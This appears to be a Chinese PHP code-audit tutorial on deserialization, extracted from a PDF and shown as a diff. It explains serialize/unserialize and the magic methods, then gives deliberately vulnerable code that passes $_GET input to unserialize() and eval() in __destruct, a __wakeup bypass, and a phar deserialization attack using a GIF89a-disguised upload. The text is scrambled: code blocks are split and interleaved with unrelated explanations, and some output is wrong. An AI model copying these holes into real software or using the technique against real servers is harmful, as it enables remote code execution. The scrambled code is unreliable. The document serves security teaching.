@@ -1,0 +1,638 @@
+语法 string serialize ( mixed $value )
+参数说明 $value: 要序列化的对象或数组。
+返回值 返回一个字符串。
+PHP 代码审计之反序列化  
+1. 序列化与反序列化  
+首先要了解序列化与反序列化的定义，以及序列化反序列化所用到的基本函数。
+序列化：把对象转换为字节序列的过程称为对象的序列化，相当于游戏中的存档。
+PHP 中的序列化函数serialize()
+serialize() 函数用于序列化对象或数组，并返回一个字符串。serialize() 函数序列化对象后，可以很
+方便的将它传递给其他需要它的地方，且其类型和结构不会改变。
+示例：
+输出结果为：
+参数说明：
+<?php
+highlight_file(__FILE__);
+$sites = array('I', 'Like', 'PHP');
+echo '<br/>';
+var_dump(serialize($sites));    // 把这个对象进行序列化
+echo '<br/>';
+class man{
+    public $name="xiaocui";
+    public $sex="man";
+    private $age=26;
+         }
+$M=new man();// 创建一个对象
+var_dump(serialize($M));        // 把这个对象进行序列化
+?> 
+string(47) "a:3:{i:0;s:1:"I";i:1;s:4:"Like";i:2;s:3:"PHP";}"
+string(79) "O:3:"man":3:
+{s:4:"name";s:7:"xiaocui";s:3:"sex";s:3:"man";s:8:"manage";i:26;}" 
+数组的序列化：
+a 代表一数组   
+3 代表数组中有 3 个元素
+i 代表数组的下标
+0 代表 I 元素的下标值
+语法 mixed unserialize ( string $str )
+参数
+说明 $str: 序列化后的字符串。
+返回
+值
+返回的是转换之后的值，可为  integer 、 float 、 string 、 array 或  object 。不可反序列化
+时返回 FALSE ，并抛出提醒。
+反序列化：把字节序列恢复为对象的过程称为对象的反序列化，相当于游戏中的读档。
+PHP 中的反序列化函数unserialize()
+unserialize() 函数用于将序列化后的字符串在还原为原来的数组或对象的过程。unserialize()函数可以
+快速将序列化的字符串还原出来，用来完成它本来的功能。
+示例代码：
+输出结果为：
+s 代表元素 I 的数据类型为字符型
+1 代表元素 I 的长度为 1
+对象的序列化：
+O 代表是一个对象
+3 代表类名 man 的长度
+3 代表类中的字段数
+s 代表属性 name 的类型为字符型
+4 代表属性 name 的长度
+// 后面的以此类推 , 序列化字符串中字段内容以 { 开始， ;} 结束
+<?php
+highlight_file(__FILE__);
+$sites = array('I', 'Like', 'PHP');
+echo '<br/>';
+echo $ser = serialize($sites).'<br/>';      // 把这个对象进行序列化
+var_dump(unserialize($ser));    // 把序列化的字符串进行反序列化
+echo '<br/>';
+class man{
+    public $name="xiaocui";
+    public $sex="man";
+    private $age=26;
+}
+$M=new man();// 创建一个对象
+echo $ser = serialize($M).'<br/>';      // 把这个对象进行序列化
+var_dump(unserialize($ser));   // 把序列化的字符串进行反序列化
+?>
+a:3:{i:0;s:1:"I";i:1;s:4:"Like";i:2;s:3:"PHP";}
+array(3) { [0]=> string(1) "I" [1]=> string(4) "Like" [2]=> string(3) "PHP" }
+O:3:"man":3:{s:4:"name";s:7:"xiaocui";s:3:"sex";s:3:"man";s:8:"manage";i:26;}
+object(man)#2 (3) { ["name"]=> string(7) "xiaocui" ["sex"]=> string(3) "man" 
+["age":"man":private]=> int(26) } 
+可以看出上述反序列化后的数组或对象，与原数据没有任何变化。
+序列化与反序列化在系统中的作用
+①把对象的字节序列永久放在磁盘中，需要时可以随时调用，大大节省磁盘占用空间。
+②在传输过程中可以直接传输字节序列，而不是对象，这可以大大提高传输速率。
+在业务系统中，需要对一些对象进行序列化存储，让他们离开内存空间，存放在一个文件中，以便持久
+化保存。例如：在用户注册并登录系统时，会将用户信息如用户名，密码， cookie 等信息先通过序列化
+存储起来，当用户再次登录时将序列化后的字节序列通过反序列化成原对象到内存进行使用，可以大大
+节省内存开销。
+2. 魔术方法  
+PHP 将所有以__（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方
+法，建议不要以  __ 为前缀。
+2.1 PHP 中常见魔术方法  
+__construct()
+具有  __construct 函数的类会在每次创建新对象时先调用此方法，适合在使用对象之前做一些初始化工
+作。
+代码示例：
+输出结果：
+__destruct()
+该函数会在到某个对象的所有引用都被删除或者当对象被销毁时执行
+代码示例：
+<?php
+highlight_file(__FILE__);
+class demo{
+    public $name="xiaocui";
+    public $sex="man";
+    private $age=26;
+    public function __construct()
+    {
+        echo "<br/>"." 类被实例化时调用我！ ";
+    }
+}
+$D=new demo();   // 实例化对象
+?>
+类被实例化时调用我！
+<?php
+highlight_file(__FILE__);
+class demo{
+输出结果：
+上述输出结果可以很直观的看到代码的执行顺序：
+__construct()=>num(5,6)=>person(nanren)=>__destruct()
+实例化对象时首先要执行构造方法__construct(), 然后接着执行类中的实例num()、person(), 当所
+有方法都执行完成销毁时，最后调用析构方法__destruct()。
+__wakeup()
+在使用  unserialize()时，会检查是否存在一个  __wakeup()魔术方法。如果存在，则该方法会先被
+调用，预先准备对象需要的资源。
+代码示例：
+    public $name="xiaocui";
+    public $sex="man";
+    private $age=26;
+    public function __construct()
+    {
+        echo "<br/>"." 类被实例化时调用我！ "."<br/>";
+    }
+    public function num($a,$b){
+        echo $c = $a + $b.'<br/>';
+        return $c;
+    }
+    public function __destruct(){
+        echo " 当类中的所有方法都被销毁时调用我！ ";
+    }
+    public function person($per){
+        echo "We are $per !!!".'<br/>';
+    }
+}
+$D=new demo();   // 实例化对象
+$D->num(5,6);   // 调用 num() 方法
+$D->person(man);        // 调用 person() 方法
+?>
+类被实例化时调用我！
+11
+We are man !!!
+当类中的所有方法都被销毁时调用我！
+<?php
+highlight_file(__FILE__);
+class demo{
+    public $name="xiaocui";
+    protected $sex="man";
+    private $age=26;
+    public function __construct()
+    {
+        echo "<br/>"." 类被实例化时调用我！ "."<br/>";
+    }
+    public function __destruct(){
+        echo "<br/>"." 当类中的所有方法都被销毁时调用我！ "."<br/>";
+输出结果：
+由于$age为私有属性，在序列化时会在前后加空白字符 %00, 原本的字符长度为 7 ，而在两侧加入空白字
+符则字符长度就会变为 9
+上述输出结果可以很直观的看到代码的执行顺序：
+__construct()=>serialize($D)=>__wakeup()=>unserialize($ser)=>__destruct()=>__d
+estruct()
+实例化对象时首先要执行构造方法__construct(), 然后执行序列化serialize($D), 然后再反序列化之
+前要执行__wakeup()方法，然后执行反序列化unserialize($ser)，当所有方法都执行完成销毁时最
+后执行__destruct()析构方法，由于反序列化后将原来的序列化字符串还原又执行一次
+__destruct()。
+__toString()
+__toString()方法用于定义一个类被当成字符串时该如何处理。
+示例代码：
+    }
+    public function __wakeup()
+    {
+        echo "<br/>"." 当反序列时首先调用我  ！ ".'<br/>';
+    }
+}
+$D=new demo();   // 实例化对象
+echo $ser = serialize($D);      // 序列化对象 $D
+var_dump(unserialize($ser));    // 反序列化字符串 $ser
+?>
+类被实例化时调用我！
+O:4:"demo":3:{s:4:"name";s:7:"xiaocui";s:6:"*sex";s:3:"man";s:9:"demoage";i:26;}
+当反序列时调用我  ！
+object(demo)#2 (3) { ["name"]=> string(7) "xiaocui" ["sex":protected]=> string(3) 
+"man" ["age":"demo":private]=> int(26) }
+当类中的所有方法都被销毁时调用我！
+当类中的所有方法都被销毁时调用我！
+<?php
+highlight_file(__FILE__);
+class demo{
+    public $name="xiaocui";
+    protected $sex="man";
+    private $age=26;
+    public function __construct()
+    {
+        echo "<br/>"." 类被实例化时调用我！ "."<br/>";
+    }
+    public function __destruct(){
+        echo "<br/>"." 当类中的所有方法都被销毁时调用我！ "."<br/>";
+    }
+    public function __wakeup()
+输出结果：
+上述输出结果可以看到，当类被当成字符串echo时，__toString()方法被调用并执行。
+如果该类中没有__toString()方法，进行 echo 输出时， PHP 会抛出致命性错误，错误如下：
+__sleep()
+在使用serialize()函数时，程序会检查类中是否存在一个  __sleep()魔术方法。如果存在，则该方
+法会先被调用，然后再执行序列化操作。
+__sleep()方法常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需
+要全部保存，该函数就起到了很好的清理作用。
+示例代码：
+    {
+        echo "<br/>"." 当反序列时调用我  ！ ".'<br/>';
+    }
+    public function __toString(){
+        return "<br/>"." 类被当成字符串处理时调用我！ "."<br/>";
+    }
+}
+$D=new demo();   // 实例化对象
+echo $D;   // 类被当成字符串输出
+?>
+类被实例化时调用我！
+类被当成字符串处理时调用我！
+当类中的所有方法都被销毁时调用我！
+Catchable fatal error: Object of class demo could not be converted to string in 
+D:\XXXX\phpstudy_pro\WWW\two\demo.php on line 30
+<?php
+highlight_file(__FILE__);
+class demo{
+    public $name="xiaocui";
+    protected $sex="man";
+    private $age=26;
+    public function __construct()
+    {
+        echo "<br/>"." 类被实例化时调用我！ "."<br/>";
+    }
+    public function __destruct(){
+        echo "<br/>"." 当类中的所有方法都被销毁时调用我！ "."<br/>";
+    }
+    public function __wakeup()
+    {
+        echo "<br/>"." 当反序列时调用我  ！ ".'<br/>';
+    }
+    public function __sleep(){
+输出结果：
+上述输出结果可以看到，当类被序列化时首先调用了__sleep()方法，该函数必须返回一个数值。如果
+该函数没有返回属性的话，序列化时会将属性清空。
+__invoke()
+当尝试以调用函数的方式调用一个对象时，__invoke方法会被自动调用。 (本特性只在  PHP 5.3.0 及以
+上版本有效。 )
+代码示例：
+        echo "<br/>"." 当序列时调用我  ！ ".'<br/>';
+        return array("name","sex","age");    // 这里必须返回一个数值，里边的元素表示返回
+的属性名称
+    }
+}
+$D=new demo();   // 实例化对象
+echo $ser = serialize($D);  // 序列化对象
+?>
+类被实例化时调用我！
+当序列时调用我 ！
+O:4:"demo":3:{s:4:"name";s:7:"xiaocui";s:6:"*sex";s:3:"man";s:9:"demoage";i:26;}
+当类中的所有方法都被销毁时调用我！
+<?php
+highlight_file(__FILE__);
+class demo{
+    public $name="xiaocui";
+    protected $sex="man";
+    private $age=26;
+    public function __construct()
+    {
+        echo "<br/>"." 类被实例化时调用我！ "."<br/>";
+    }
+    public function __destruct(){
+        echo "<br/>"." 当类中的所有方法都被销毁时调用我！ "."<br/>";
+    }
+    public function __wakeup()
+    {
+        echo "<br/>"." 当反序列化时调用我  ！ ".'<br/>';
+    }
+    public function __sleep(){
+        echo "<br/>"." 当序列化时调用我  ！ ".'<br/>';
+        return array("name","sex","age");
+    }
+    public function __invoke()
+    {
+        echo "<br/>"." 当以函数的方式调用对象时会调用我！ ".'<br/>';
+    }
+结果输出：
+上述结果可以看到当使用函数的方法调用对象时，就会调用__invoke()方法 .
+如果没有类中没有该方法，那么 PHP 会报出致命性错误，如下：
+__call()
+在对象中调用一个不存在或者不可访问方法时，__call会被调用。
+代码示例：
+}
+$D=new demo();   // 实例化对象
+$D();    // 以函数的方式调用对象
+?>
+类被实例化时调用我！
+当以函数的方式调用对象时会调用我！
+当类中的所有方法都被销毁时调用我！
+Fatal error: Uncaught Error: Function name must be a string in 
+D:\xxxxx\phpstudy_pro\WWW\two\demo.php:42 Stack trace: #0 {main} thrown in 
+D:\xxxxx\phpstudy_pro\WWW\two\demo.php on line 42
+<?php
+highlight_file(__FILE__);
+class demo{
+    public $name="xiaocui";
+    protected $sex="man";
+    private $age=26;
+    public function __construct()
+    {
+        echo "<br/>"." 类被实例化时调用我！ "."<br/>";
+    }
+    public function num($a,$b){
+        echo "<br/>".$c = $a + $b.'<br/>';
+        return $c;
+    }
+    public function __destruct(){
+        echo "<br/>"." 当类中的所有方法都被销毁时调用我！ "."<br/>";
+    }
+    public function person($per){
+        echo "<br/>"."We are $per !!!".'<br/>';
+    }
+    public function __wakeup()
+    {
+        echo "<br/>"." 当反序列化时调用我  ！ ".'<br/>';
+    }
+    public function __sleep(){
+        echo "<br/>"." 当序列时调用我  ！ ".'<br/>';
+结果输出：
+__set()
+给不可访问属性赋值时，__set会被调用。
+代码示例：
+        return array("name","sex","age");
+    }
+    public function __call($arg1,$arg2){
+        echo  "<br/>"." 当对象调用一个不存在或者不可访问的方法时调用我！ ".'<br/>';
+    }
+}
+$D=new demo();   // 实例化对象
+$D->num1(1,2);   // 调用一个不存在的方法
+?>
+类被实例化时调用我！
+当对象调用一个不存在或者不可访问的方法时调用我 ！
+当类中的所有方法都被销毁时调用我！
+<?php
+highlight_file(__FILE__);
+class demo extends demo1{
+    public $name="xiaocui";
+    protected $sex="man";
+    private $age=26;
+    public function __construct()
+    {
+        echo "<br/>"." 类被实例化时调用我！ "."<br/>";
+    }
+    public function __destruct(){
+        echo "<br/>"." 当类中的所有方法都被销毁时调用我！ "."<br/>";
+    }
+    public function person($per){
+        echo "<br/>"."We are $per !!!".'<br/>';
+    }
+    public function __set($arg1,$arg2){
+        echo "<br/>"." 当给不存在或者不可访问的属性赋值时调用我！ "."<br/>";
+    }
+}
+class demo1{
+    private $weight;
+    public  $height;
+    public function people(){
+        echo $this->weight;
+        echo $this->height;
+输出结果：
+__isset()
+对不可访问属性调用isset()或  empty() 时，__iset() 会被调用。
+__unset()
+对不可访问属性调用  unset()时，__unset()会被调用。
+__get()
+读取不可访问属性的值时，__get会被调用。
+代码示例：
+    }
+}
+$D=new demo();   // 实例化对象
+$D->weight=74; // 给不可访问的属性赋值
+?>
+类被实例化时调用我！
+当给不存在或者不可访问的属性赋值时调用我！
+当类中的所有方法都被销毁时调用我！
+<?php
+highlight_file(__FILE__);
+class demo extends demo1{
+    public $name="xiaocui";
+    protected $sex="man";
+    private $age=26;
+    public function __construct()
+    {
+        echo "<br/>"." 类被实例化时调用我！ "."<br/>";
+    }
+    public function __destruct(){
+        echo "<br/>"." 当类中的所有方法都被销毁时调用我！ "."<br/>";
+    }
+    public function __get($arg1){
+        echo "<br/>"." 读取不存在或不可访问的属性时调用我！ ";
+    }
+}
+class demo1{
+    private $weight = 0;
+    public  $height;
+    public function people(){
+        echo $this->weight;
+        echo $this->height;
+    }
+}
+输出结果：
+3. 反序列化漏洞  
+3.1 反序列化漏洞利用条件  
+代码示例 1 ：
+上述的代码满足反序列化漏洞的两个条件，arg参数可控，也就是unserialize()函数的参数可控 ; 存
+在可利用的类demo，且 demo 类中有可利用的魔术方法__destruct(), 然而__destruct()魔术方法中
+使用 echo 输出变量了arg。
+通过arg参数，构造序列化字符串，通过unserialize()函数进行反序列化，最后通过__destruct()
+魔术方法输出变量，造成XSS。
+$D=new demo();   // 实例化对象
+$D->weight;   // 读取父类中不可访问的属性
+?>
+类被实例化时调用我！
+读取不存在或不可访问的属性时调用我！
+当类中的所有方法都被销毁时调用我！
+①  unserialize() 函数中参数可控
+②  存在可利用的类，且类中有魔术方法
+<?php
+highlight_file(__FILE__);
+class demo
+{
+    public $arg1 = "0";
+   public function __destruct()
+    {
+        echo $this->arg1;  // 输出用户传递的 arg1 值
+    }
+}
+$a=$_GET['arg'];     // 接收前端传递的 arg1 变量
+$unser = unserialize($a);    // 反序列化传递的 arg1
+?>
+示例代码 2 ：
+如果魔术方法中存在eval()，且参数可控，那么通过构造序列化字符串，通过反序列化漏洞造成
+RCE。
+<?php
+highlight_file(__FILE__);
+class demo
+{
+    public $arg1 = "0";
+    public function __destruct()
+    {
+        eval($this->arg1);  //eval() 去执行用户传递的 arg1 值
+    }
+}
+$a=$_GET['arg'];     // 接收前端传递的 arg1 变量
+$unser = unserialize($a);    // 反序列化传递的 arg1
+var_dump($unser);
+?>
+3.2 __wakeup() 函数绕过  
+在序列化时传递对象的属性大于实际对象的属性时，__wakeup()魔术方法将不会被执行，从而导致绕
+过。
+PHP 版本 <=5.6.25 或者 PHP 版本 <=7.0.11
+示例代码：
+<?php
+highlight_file(__FILE__);
+class demo
+{
+    public $arg1 = "0";
+    public function __destruct()
+    {
+       eval($this->arg1);  //eval() 去执行用户传递的 arg1 值
+    }
+    public function __wakeup(){
+        foreach(get_object_vars($this) as $k => $v) {
+                $this->$k = '';          // 将传入的参数遍历，全部赋值为空
+            }
+    }
+}
+$a=$_GET['arg'];     // 接收前端传递的 arg1 变量
+$unser = unserialize($a);    // 反序列化传递的 arg1
+如果属性值与对象实际属性值相同，则会在反序列化时执行__wakeup()函数，将传入的变量值替换为
+空。
+如果属性值设置大于实际对象属性值则会导致__wakeup()函数被绕过，从而反序列化执行我们的序列
+化字符串中的内容。
+var_dump($unser);
+?>
+3.3 phar 反序列化  
+  phar反序列化最先是在 2018 年 8 月份的 Blackhat 2018 大会上，由安全研究员 Sam Thomas 提出来
+的，该反序列化最强之处在与它不需要借助unserialize()函数即可将字节序列反序列化为字符串。漏
+洞触发是利用Phar:// 伪协议读取phar文件时，会反序列化meta-data储存的信息。
+phar 介绍
+  PHAR (“Php ARchive”) 是 PHP 里类似于 jar 的一种打包文件，在 PHP 5.3 或更高版本中默认开启，这
+个特性使得  PHP 也可以像   Java 一样方便地实现应用程序打包和组件化。一个应用程序可以打成一个 
+Phar 包，直接放到  PHP-FPM 中运行。
+phar 文件结构
+phar 文件大致会被分为 3~4 部分，如下表
+第一部分  a stub
+stub 的基本结构：xxx<?php xxx;__HALT_COMPILER();?>，前面内容不限，但必须以
+__HALT_COMPILER();?>来结尾，否则 phar 扩展将无法识别这个文件为 phar 文件，类似于图片格式中的
+图片头一样。
+第二部分  a manifest describing the contents
+phar 文件被压缩的一些信息，其中Meta-data部分会被序列化存储。
+第三部分  the file content
+这部分内容可以随便填写，例如图片中有些内容部分修改后对图片不会产生影响，我们可利用这部分来
+触发反序列化。
+第四部分  a signature for verifying Phar integrity
+这部分为 phar 文件的签名
+更多 phar 格式可查看 PHP 官方文档：
+通过上面的文件结构我们可以通过 pahr 类下的方法来构造 phar 文件
+pharFile.php
+将 pharFile.php 放到 WWW 可解析目录下访问即可生成上面pharFile.phar文件。
+注意在访问之前要设置 php.ini 中 phar.readonly 配置为off，否则会报如下错误
+https://www.php.net/manual/zh/phar.fileformat.php
+<?php
+    class TestObject {
+    }
+    $phar = new Phar("pharFile.phar");  // 后缀名必须为 phar
+    $phar->startBuffering();
+    $phar->setStub("<?php __HALT_COMPILER(); ?>"); // 设置第一部分的 stub
+    $o = new TestObject();
+    $o -> data='hello world!';
+    $phar->setMetadata($o); // 将自定义的 meta-data 存入 manifest
+    $phar->addFromString("demo.txt", "demo"); // 添加要压缩的文件
+    $phar->stopBuffering();  // 签名会自动生成
+?>
+fileatime filectime file_exists file_get_contents
+file_put_content file filegroup fopen
+fileinode filemtime fileowner fileperms
+
+用十六进制编辑器打开该文件就可看到该文件完整的文件结构，如上述描述相同meta-data部分被序列
+化进行存储。
+这里就要用到phar://伪协议， phar 伪协在解析 phar 文件时会将meta-data部分进行反序列化，而如
+下函数都会收到该协议的影响：
+受影响函数：
+fileatime filectime file_exists file_get_contents
+is_dir is_exectable is_file is_link
+is_readable is_writeable is_writeable parse_ini_file
+copy unlink stat readfile
+如下是 phar 反序列化一段简单的代码
+demo1.php
+这里我们通过 phar 伪协议成功触发了 pahrFile.phar 文件并输出序列化meta-data内容，打印出了 hello 
+world 。
+phar 反序列化漏洞
+示例代码：
+upload_file.php
+<?php
+highlight_file(__FILE__);
+class TestObject{
+    function __destruct()
+    {
+        echo $this -> data;
+    }
+}
+include('phar://pharFile.phar');
+?>
+漏洞准备：
+upload_file.php ，文件上传检测代码，判断文件类型是否为 gif 以及文件后缀名是否为 gif
+upload.html 简单构造一个文件上传表单
+filePhar.php 存在 file_exists() ，并且存在 __destruct()
+
+pahr 反序列化利用条件：
+pahr 格式的文件能被上传到服务器
+存在上述受影响函数
+相应关键字没有被过滤掉： phar 、 /
+存在魔术方法作为中间跳板
+upload.html
+filePhar.php
+首先我们根据存在漏洞的filePhar.php文件构造一个生成 phar 文件的代码并且需要为 gif 格式，所以需
+要加GIF89a，然后我们访问这个 php 文件后，生成了 phar.phar ，修改后缀为 gif ，上传到服务器，然后
+利用 file_exists() 函数，使用phar://完成反序列化。
+构造 phar 代码如下：
+<?php
+if (($_FILES["file"]["type"]=="image/gif")&&(substr($_FILES["file"]["name"], 
+strrpos($_FILES["file"]["name"], '.')+1))== 'gif') {
+    if (file_exists($_FILES["file"]["name"]))
+    {
+        echo $_FILES["file"]["name"] . " already exists. ";
+    }
+    else
+    {
+        move_uploaded_file($_FILES["file"]["tmp_name"], $_FILES["file"]
+["name"]);
+        echo "success";
+    }
+}
+else
+{
+    echo "fail";
+}
+<body>
+<form action="./upload_file.php" method="post" enctype="multipart/form-data">
+    <input type="file" name="file" />
+    <input type="submit" name=" 上传 " />
+</form>
+</body>
+<?php
+$file=$_REQUEST['file'];
+class AnyClass{
+    function __destruct()
+    {
+        eval($this -> output);
+    }
+}
+file_exists($file);
+<?php
+class AnyClass{
+     function __destruct()
+    {
+        eval($this -> output);
+    }
+}
+$phar = new Phar('phar.phar');
+将生成的phar.phar文件修改后缀为 gif 绕过upload_file.php中 gif 检测。
+通过upload.html页面上传phar.gif图片，并通过filePhar.php文件phar://协议最终反序列化执
+行 phpinfo
+3.4 反序列化字符串逃逸  
+反序列化字符串逃逸大家可以看下这篇文章，讲的比较详细，这里就不多赘述了。
+4. 反序列化代码审计总结  
+$phar -> stopBuffering();
+$phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');
+$phar -> addFromString('ceshi.php','ceshi');
+$object = new AnyClass();
+$object -> output= 'phpinfo();';
+$phar -> setMetadata($object);
+$phar -> stopBuffering();
+https://www.cnblogs.com/Sumarua/p/12932401.html
+
+反序列化在现实场景中见的其实并不是很多，一是黑盒中几乎无法找到反序列化漏洞只能用工具探测一些已经
+存在的反序列化漏洞，二是在审计中反序列化的调用链一般比较复杂如果没有很好的代码功底也能难找到其中
+的调用链来触发反序列化漏洞。
+在本节大家只需要将序列化常见的魔术方法以及相应魔术方法的触发规则以及序列化反序列化的简单触发方式
+多加练习打牢基础，在后续的阶段中会针对反序列化做针对性的教程。
